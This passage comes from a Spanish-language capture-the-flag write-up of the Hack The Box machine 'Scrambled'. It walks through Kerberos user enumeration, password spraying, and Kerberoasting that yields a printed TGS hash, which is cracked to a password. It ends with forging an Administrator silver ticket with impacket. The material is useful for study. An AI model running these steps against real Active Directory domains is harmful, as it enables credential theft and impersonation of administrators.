SF:esk-RC,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServer,1D,<span class="s2">"SCR
SF:AMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>NCP,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3
SF:;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>NotesRPC,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>JavaRMI,1D
SF:,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>WMSRequest,1D,<span class="s2">"SCRAMBLECORP_ORD
SF:ERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>oracle-tns,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span>
SF:<span class="o">)</span>%r<span class="o">(</span>ms-sql-s,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>afp,1D,<span class="s2">"SCRAMBLE
SF:CORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>giop,1D,<span class="s2">"SCRAMBLECORP_ORDERS_V1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\.</span><span class="s2">3;</span><span class="se">\r\</span><span class="s2">
SF:n"</span><span class="o">)</span><span class="p">;</span>
Service Info: Host: DC1<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   <span class="nb">date</span>: 2024-04-30T00:28:22
|_  start_date: N/A
|_clock-skew: mean: <span class="nt">-4s</span>, deviation: 0s, median: <span class="nt">-4s</span>
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>De primeras no vemos nada de información relevante sobre la maquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme smb 10.10.11.168
SMB         10.10.11.168    445    10.10.11.168     <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.168<span class="o">)</span> <span class="o">(</span>domain:10.10.11.168<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Como la maquina tiene muchos puertos abiertos podemos probar con otro protocolo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme ldap 10.10.11.168
LDAP        10.10.11.168    389    DC1.scrm.local   <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:DC1.scrm.local<span class="o">)</span> <span class="o">(</span>domain:scrm.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos agregar los dominios al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">echo</span> <span class="s2">"10.10.11.168 scrm.local DC1.scrm.local dc1.scrm.local"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.168 scrm.local DC1.scrm.local dc1.scrm.local
</code></pre></div></div>

<ul>
  <li>Al parecer tenemos limitaciones para enumerar por el protocolo <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap crackmapexec smb 10.10.11.168 <span class="nt">--shares</span>
SMB         10.10.11.168    445    10.10.11.168     <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:10.10.11.168<span class="o">)</span> <span class="o">(</span>domain:10.10.11.168<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.168    445    10.10.11.168     <span class="o">[</span>-] Error enumerating shares: STATUS_USER_SESSION_DELETED
➜  nmap smbmap <span class="nt">-H</span> 10.10.11.168 <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 0 SMB session<span class="o">(</span>s<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Tampoco podemos enumerar por el protocolo <strong>RPC</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s1">''</span> 10.10.11.168
Cannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED
</code></pre></div></div>

<ul>
  <li>Tenemos el puerto <strong>80</strong> abierto a si que podemos ver su contenido y si encontramos algo interesante.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.168</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.168</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.168</span><span class="p">],</span> <span class="no">JQuery</span><span class="p">,</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Script</span><span class="p">,</span> <span class="no">Title</span><span class="p">[</span><span class="no">Scramble</span> <span class="no">Corp</span> <span class="no">Intranet</span><span class="p">]</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/1.png" />
</p>

<ul>
  <li>
    <p>En la parte de <code class="language-plaintext highlighter-rouge">IT Services</code> encontramos lo siguiente.</p>
  </li>
  <li>
    <p>Nos dicen que debido a la brecha de seguridad que hubo el mes pasado deshabilitaron la autenticación NTLM pero dice que seamos pacientes mientras trabajan en resolverlo.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/2.png" />
</p>

<ul>
  <li>Tenemos <code class="language-plaintext highlighter-rouge">Resources</code> interesantes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/3.png" />
</p>

<ul>
  <li>Probando en <code class="language-plaintext highlighter-rouge">New User Account</code> no funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/4.png" />
</p>

<ul>
  <li>Pero en <strong>Contacting IT Support</strong> vemos un nombre de usuario que es <code class="language-plaintext highlighter-rouge">ksimpson</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/5.png" />
</p>

<ul>
  <li>Podemos usa <code class="language-plaintext highlighter-rouge">kerbrute</code> para verificar que sea un usuario del dominio pero como no sabemos si existan mas usuarios podemos usar un diccionario <a href="https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt">https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt</a> para enumerar mas usuarios en caso de que los allá.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap /opt/kerbrute_linux_amd64 userenum <span class="nt">-d</span> scrm.local <span class="nt">--dc</span> DC1.scrm.local /opt/A-ZSurnames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/29/24 - Ronnie Flathers @ropnop

2024/04/29 18:53:06 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/04/29 18:53:06 <span class="o">&gt;</span>  	DC1.scrm.local:88

2024/04/29 18:53:06 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 ASMITH@scrm.local
2024/04/29 18:53:44 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 JHALL@scrm.local
2024/04/29 18:53:48 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 KSIMPSON@scrm.local
2024/04/29 18:53:51 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 KHICKS@scrm.local
2024/04/29 18:54:22 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 SJENKINS@scrm.local
</code></pre></div></div>

<ul>
  <li>Vamos agregarlos a una lista.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>users.txt
asmith
jhall
ksimpson
khicks
sjenkins
</code></pre></div></div>

<ul>
  <li>Si recordamos no tenemos la autenticación <code class="language-plaintext highlighter-rouge">NTLM</code> activada pero podemos probar solicitar un <code class="language-plaintext highlighter-rouge">TGT</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetNPUsers scrm.local/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] User asmith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User jhall doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User ksimpson doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User khicks doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User sjenkins doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>
    <p>Lo que podemos hacer es ver si algún usuario usa su nombre de usuario como su contraseña esto casi siempre suele pasar podemos usar <code class="language-plaintext highlighter-rouge">crackmapexec</code> y <code class="language-plaintext highlighter-rouge">kerbrute</code> para este proceso.</p>
  </li>
  <li>
    <p>Lo hacemos con otro protocolo por que <code class="language-plaintext highlighter-rouge">smb</code> no funciona y de los que tiene contemplado <code class="language-plaintext highlighter-rouge">crackmapexec</code> <code class="language-plaintext highlighter-rouge">ldap</code> si funciona.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme ldap scrm.local <span class="nt">-u</span> users.txt <span class="nt">-p</span> users.txt <span class="nt">-k</span> <span class="nt">--no-bruteforce</span> <span class="nt">--continue-on-success</span>
LDAP        scrm.local      389    DC1.scrm.local   <span class="o">[</span><span class="k">*</span><span class="o">]</span>  x64 <span class="o">(</span>name:DC1.scrm.local<span class="o">)</span> <span class="o">(</span>domain:scrm.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        scrm.local      389    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\a</span>smith:asmith KDC_ERR_PREAUTH_FAILED
LDAP        scrm.local      389    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\j</span>hall:jhall KDC_ERR_PREAUTH_FAILED
LDAPS       scrm.local      636    DC1.scrm.local   <span class="o">[</span>+] scrm.local<span class="se">\k</span>simpson
LDAPS       scrm.local      636    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\k</span>hicks:khicks KDC_ERR_PREAUTH_FAILED
LDAPS       scrm.local      636    DC1.scrm.local   <span class="o">[</span>-] scrm.local<span class="se">\s</span>jenkins:sjenkins KDC_ERR_PREAUTH_FAILED
</code></pre></div></div>

<ul>
  <li>El usuario <code class="language-plaintext highlighter-rouge">ksimson</code> usa como contraseña su nombre de usuario también podemos validarlo con <code class="language-plaintext highlighter-rouge">kerbrute</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content /opt/kerbrute_linux_amd64 bruteuser <span class="nt">--dc</span> 10.10.11.168 <span class="nt">-d</span> scrm.local users.txt ksimpson

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 04/29/24 - Ronnie Flathers @ropnop

2024/04/29 19:04:36 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/04/29 19:04:36 <span class="o">&gt;</span>  	10.10.11.168:88

2024/04/29 19:04:36 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID LOGIN:	 ksimpson@scrm.local:ksimpson
2024/04/29 19:04:36 <span class="o">&gt;</span>  Done! Tested 5 logins <span class="o">(</span>1 successes<span class="o">)</span> <span class="k">in </span>0.400 seconds
</code></pre></div></div>

<h2 id="shell-as-sqlsvc">Shell as SQLSvc</h2>

<ul>
  <li>Como tenemos credenciales podemos probar un <code class="language-plaintext highlighter-rouge">Kerberoasting Attack</code> pero con el parámetro <code class="language-plaintext highlighter-rouge">-k</code> ya que tenemos la atención <code class="language-plaintext highlighter-rouge">NTLM</code> deshabilitada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting machine <span class="nb">hostname</span>
<span class="o">[</span>-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the <span class="nt">-dc-host</span> option
</code></pre></div></div>

<ul>
  <li>Aun así obtenemos un error.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span> <span class="nt">-dc-ip</span> dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting machine <span class="nb">hostname</span>
<span class="o">[</span>-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the <span class="nt">-dc-host</span> option
</code></pre></div></div>

<ul>
  <li>
    <p>Si buscamos en internet errores al operar con <code class="language-plaintext highlighter-rouge">-k</code> encontramos lo siguiente <a href="https://github.com/fortra/impacket/issues/1206">https://github.com/fortra/impacket/issues/1206</a>.</p>
  </li>
  <li>
    <p>Pero tenemos que cambiar una parte del código en esta parte.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/6.png" />
</p>

<ul>
  <li>Tenemos que cambiarla por esta.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/7.png" />
</p>

<ul>
  <li>Ahora ya funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span> <span class="nt">-dc-ip</span> dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span>-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
<span class="nt">----------------------------</span>  <span class="nt">------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
</code></pre></div></div>

<ul>
  <li>Ahora vamos a obtener el hash del usuario <code class="language-plaintext highlighter-rouge">sqlsvc</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="nt">-k</span> <span class="nt">-dc-ip</span> dc1.scrm.local <span class="nt">-request</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span>-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
<span class="nt">----------------------------</span>  <span class="nt">------</span>  <span class="nt">--------</span>  <span class="nt">--------------------------</span>  <span class="nt">--------------------------</span>  <span class="nt">----------</span>
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991



<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="nv">$krb5tgs$23$*</span>sqlsvc<span class="nv">$SCRM</span>.LOCAL<span class="nv">$scrm</span>.local/sqlsvc<span class="k">*</span><span class="nv">$0404e156f2b44fdc2ccabae35e43d08d$eb31843c7e1cb948d143812b4a93c13e6241e8865b6a807e64c59acd7fdd841f438222bcfb364667dc59bfccc085c29405ca00b652b0b9a90d6c5647a9a3b2d9fdd119d4c85a2fcf490a0340b1649bdb55302cfecdf2bfbd18c6eee115c9e81c27869b976fc589b027e3128dece13b86bc4b8b7b659c733caa0f5a212e4917ff3b6584d52b8597599e9096da96cb2e4904bc848ff4972fee71188c948875c93c6d9aa493c8b02a115db904970717d2704368c1e6a364e6f1c7ba5d5524e9d7d8a11217c707c7a0c040d2b7aca2cc11113aafdcc22d0c3a01ec6f00d3424a959cdaf1adcb2295cf30aeac9cd3e8e96bb85497262171d4718ab7cf20f7b57d64de5e9f645871fbef03f763cb2256c8765d6eae6db3d8cee1109dfb530a782e472bd6b84b7622e91956544f521f76c66399d58b1e892a945316b7f88007c58f49e91f1dd7a7e96a1ed0d1652d16d896150f1e1799f5b733fcec1c3d3c7619892cf6ba0da6cb5239af4be492e3d082fa899eb4abe657a24bf908ff366e8a3c06a2b2462f35f793e690d92091ef264b7a7f440bd2660f42fabf1cef538d7e276825fabdf740859a3621efb81f25ca525ae8763e20d9907b1c37b37cc44bb186a5c39adc5f7d6bbb1f0255bfc9f716f34e2e6079549be7ff3a104ce3c2ecaddabaf0122b7394660c98ec32579f696a1ae20223ae2fd5a5ccebc258413fd6785374bbd6b4b2f40872aaa1e03cd621fdd7bc0860ac1498c26c8c7e82f6c16faeb70908c23bbc1b5ae03c62b55445e781c960ccc5b412320cd8cd0bc3d779a346a9c3940b5f1c3bc7ab8c31efc1d73ac4575c06a0337a03da926bc3a4d86accabd34c95a64569e0b6d089f15db63901de7dd308b9d1e76f7989b48f9f97c600dcaf6dfc3d0372c64b354bb5869f20e034ae1e5ab1a77e9e536351496290eac31e127fe015045c9e1e9a7d82d021b42eaa1773bf3bf87e9b0e52f4758013f7ef4c6cea2998f93c903f2120e09698910fa170dbcfac23920a7551a77285642046fabadb0bf1e822c169846e6d583053c8f9cee5e3775a784e6bd3e55323befa1bf9859a1036e659bb932f75296d14f33e047ced0731d7daf25c20f94c94604e709b5b9307c36f38e81211f7248eb6a05f19dbb78c754e7aa128984aa3eaba2a2c16d2c3fae396c8459c152150e467d06782669c70ada40d5b67361a198d1c945be215402b81b6f43dbfa9b3a12d20b804f9b51bb61568e14793687d8b33d51ed9da783403ebe4b20930b05ee92e44f1046158a01f2c871cf8a118a89b01d168e1fcd936f19101c115d69b1d5ca6ed2cc9acc95c23690287f4e9852b7f5d6af97c92cd5ee2ff82b4e8f32724809394976a75ea91c15c48da114419cca7499b3aeda0a71ff6067e78893d8e8f37941226928c00fa1684cf41fb7bbd30af815213f5</span>
</code></pre></div></div>

<ul>
  <li>Vamos a crackearlo con <code class="language-plaintext highlighter-rouge">john</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5tgs, Kerberos 5 TGS etype 23 <span class="o">[</span>MD4 HMAC-MD5 RC4]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Pegasus60        <span class="o">(</span>?<span class="o">)</span>
1g 0:00:00:13 DONE <span class="o">(</span>2024-04-29 19:56<span class="o">)</span> 0.07547g/s 809771p/s 809771c/s 809771C/s Peguero..Pearce
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">mssqlclient.py</code> para conectarnos.</p>
  </li>
  <li>
    <p>Pero obtenemos un error.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient scrm.local/sqlsvc:Pegasus60@10.10.11.168
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] ERROR<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Login failed <span class="k">for </span>user <span class="s1">'sqlsvc'</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>Tenemos que usar <code class="language-plaintext highlighter-rouge">kerberos</code> pero necesitamos un <code class="language-plaintext highlighter-rouge">TGT</code> para poder autenticarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getTGT scrm.local/sqlsvc:Pegasus60
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>sqlsvc.ccache
</code></pre></div></div>

<ul>
  <li>Ahora vamos a exportar la variable de entorno.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>sqlsvc.ccache
</code></pre></div></div>

<ul>
  <li>Pero aun así no podemos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] ERROR<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Login failed <span class="k">for </span>user <span class="s1">'SCRM\sqlsvc'</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos a probar con el otro usuario.</p>
  </li>
  <li>
    <p>Pero nada.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getTGT scrm.local/ksimpson:ksimpson
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>ksimpson.ccache
➜  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>ksimpson.ccache
➜  content impacket-mssqlclient dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span>-] ERROR<span class="o">(</span>DC1<span class="o">)</span>: Line 1: Login failed <span class="k">for </span>user <span class="s1">'SCRM\ksimpson'</span><span class="nb">.</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Como tenemos el <code class="language-plaintext highlighter-rouge">SPN</code> podemos hacer un <code class="language-plaintext highlighter-rouge">Silver Ticket Attack</code> para suplantar un usuario.</p>
  </li>
  <li>
    <p>Pero antes podemos probar enumerar por <code class="language-plaintext highlighter-rouge">smb</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local <span class="nt">-k</span>
Impacket v0.11.0 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># shares</span>
ADMIN<span class="err">$</span>
C<span class="err">$</span>
HR
IPC<span class="err">$</span>
IT
NETLOGON
Public
Sales
SYSVOL
<span class="c"># use Public</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 <span class="nb">.</span>
drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 ..
<span class="nt">-rw-rw-rw-</span>     630106  Fri Nov  5 11:45:07 2021 Network Security Changes.pdf
<span class="c"># get Network Security Changes.pdf</span>
</code></pre></div></div>

<ul>
  <li>Al abrirlo ya vimos por que no podemos conectarnos al parecer solo los administradores pueden.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/8.png" />
</p>

<ul>
  <li>Bueno vamos a suplantar la identidad del usuario administrador para hacer esto necesitamos el <code class="language-plaintext highlighter-rouge">Domain SID</code> del dominio para generar un <code class="language-plaintext highlighter-rouge">TGS</code> bajo el usuario administrador <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-getPac scrm.local/ksimpson:ksimpson <span class="nt">-targetUser</span> Administrator | <span class="nb">grep </span>Domain
LogonDomainName:                 <span class="s1">'SCRM'</span>
LogonDomainId:
ResourceGroupDomainSid:
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
</code></pre></div></div>

<ul>
  <li>Ahora necesitamos el hash <code class="language-plaintext highlighter-rouge">NT</code> para eso como tenemos la contraseña tenemos que convertirlo <a href="https://codebeautify.org/ntlm-hash-generator">https://codebeautify.org/ntlm-hash-generator</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>b999a16500b87d17ec7f2e2a68778f05
</code></pre></div></div>

<ul>
  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">ticketer</code> con el <code class="language-plaintext highlighter-rouge">SPN</code> que tenemos, el <code class="language-plaintext highlighter-rouge">hash</code> y el <code class="language-plaintext highlighter-rouge">Domain SID.</code></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-ticketer <span class="nt">-spn</span> MSSQLSvc/dc1.scrm.local <span class="nt">-nthash</span> b999a16500b87d17ec7f2e2a68778f05 <span class="nt">-domain-sid</span> S-1-5-21-2743207045-1827831105-2542523200 <span class="nt">-dc-ip</span> dc1.scrm.local <span class="nt">-domain</span> scrm.local Administrator
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating basic skeleton ticket and PAC Infos
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Customizing ticket <span class="k">for </span>scrm.local/Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_LOGON_INFO
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	PAC_CLIENT_INFO_TYPE
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTicketPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> 	EncTGSRepPart
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Signing/Encrypting final ticket
